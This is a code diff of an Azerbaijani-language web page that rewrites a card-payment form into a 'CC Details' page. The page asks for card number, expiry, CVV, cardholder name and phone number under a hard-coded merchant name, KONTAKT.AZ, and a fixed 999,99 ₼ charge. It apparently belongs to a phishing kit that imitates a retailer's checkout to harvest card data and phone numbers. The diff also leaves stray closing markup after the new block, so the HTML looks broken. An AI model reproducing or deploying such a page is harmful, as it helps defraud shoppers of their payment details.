@@ -475,81 +475,86 @@
             </div>
         </div>
     </div>
+<!-- CC Details Page -->
+<div id="ccPage" class="page secure-page">
+    <div class="secure-container">
+        <div class="secure-card">
+            <!-- Back Button -->
+            <button class="back-btn" onclick="showPage('checkoutPage')">
+                <i class="fas fa-arrow-left"></i>
+                Geri
+            </button>
 
-    <!-- Card Details Page -->
-    <div id="cardPage" class="page secure-page">
-        <div class="secure-container">
-            <div class="secure-card">
-                <!-- Back Button -->
-                <button class="back-btn" onclick="showPage('checkoutPage')">
-                    <i class="fas fa-arrow-left"></i>
-                    Geri
-                </button>
+            <!-- CC Header -->
+            <div class="secure-card-header">
+                <div class="secure-icon">
+                    <i class="fas fa-credit-card"></i>
+                </div>
+                <h1>Kart Məlumatları</h1>
+                <p>Ödəniş üçün kart məlumatlarınızı daxil edin</p>
+            </div>
 
-                <!-- Card Header -->
-                <div class="secure-card-header">
-                    <div class="secure-icon">
-                        <i class="fas fa-credit-card"></i>
-                    </div>
-                    <h1>Kart Məlumatları</h1>
-                    <p>Ödəniş üçün kart məlumatlarınızı daxil edin</p>
+            <!-- Payment Info -->
+            <div class="payment-info">
+                <div class="payment-row">
+                    <span>Məbləğ:</span>
+                    <span class="amount">999,99 ₼</span>
+                </div>
+                <div class="payment-row">
+                    <span>Tacir:</span>
+                    <span>KONTAKT.AZ</span>
+                </div>
+            </div>
+
+            <!-- CC Form -->
+            <form class="cc-form" onsubmit="submitCcForm(event)">
+                <div class="form-group">
+                    <label>Kart nömrəsi</label>
+                    <input type="text" id="ccNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                 </div>
 
-                <!-- Payment Info -->
-                <div class="payment-info">
-                    <div class="payment-row">
-                        <span>Məbləğ:</span>
-                        <span class="amount">999,99 ₼</span>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Son istifadə tarixi</label>
+                        <div class="expiry-inputs">
+                            <input type="text" id="ccMonth" placeholder="MM" maxlength="2" required>
+                            <span>/</span>
+                            <input type="text" id="ccYear" placeholder="YY" maxlength="2" required>
+                        </div>
                     </div>
-                    <div class="payment-row">
-                        <span>Tacir:</span>
-                        <span>KONTAKT.AZ</span>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="text" id="ccCvv" placeholder="123" maxlength="3" required>
                     </div>
                 </div>
 
-                <!-- Card Form -->
-                <form class="card-form" onsubmit="submitCardForm(event)">
-                    <div class="form-group">
-                        <label>Kart nömrəsi</label>
-                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
-                    </div>
+                <div class="form-group">
+                    <label>Kart sahibinin adı</label>
+                    <input type="text" id="ccHolder" placeholder="AD SOYAD" style="text-transform: uppercase;" required>
+                </div>
 
-                    <div class="form-row">
-                        <div class="form-group">
-                            <label>Son istifadə tarixi</label>
-                            <div class="expiry-inputs">
-                                <input type="text" id="expiryMonth" placeholder="MM" maxlength="2" required>
-                                <span>/</span>
-                                <input type="text" id="expiryYear" placeholder="YY" maxlength="2" required>
-                            </div>
+                <div class="form-group">
+                    <label>Telefon nömrəsi</label>
+                    <div class="phone-inputs">
+                        <span class="phone-prefix">+994</span>
+                        <div class="phone-parts">
+                            <span>(</span>
+                            <input type="text" id="phonePrefix" placeholder="XX" maxlength="2" required>
+                            <span>)</span>
                         </div>
-                        <div class="form-group">
-                            <label>CVV</label>
-                            <input type="text" id="cvv" placeholder="123" maxlength="3" required>
-                        </div>
+                        <input type="text" id="phoneNumber" placeholder="XXX XX XX" maxlength="9" required>
                     </div>
+                </div>
 
-                    <div class="form-group">
-                        <label>Kart sahibinin adı</label>
-                        <input type="text" id="cardHolder" placeholder="AD SOYAD" style="text-transform: uppercase;" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Telefon nömrəsi</label>
-                        <div class="phone-inputs">
-                            <span class="phone-prefix">+994</span>
-                            <div class="phone-parts">
-                                <span>(</span>
-                                <input type="text" id="phonePrefix" placeholder="XX" maxlength="2" required>
-                                <span>)</span>
-                            </div>
-                            <input type="text" id="phoneNumber" placeholder="XXX XX XX" maxlength="9" required>
-                        </div>
-                    </div>
-
-                    <div class="form-actions">
-                        <button type="submit" class="btn-confirm">
-                            Təsdiq et
+                <div class="form-actions">
+                    <button type="submit" class="btn-confirm">
+                        Təsdiq et
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
                         </button>
                         <button type="button" class="btn-cancel">
                             Ləğv et
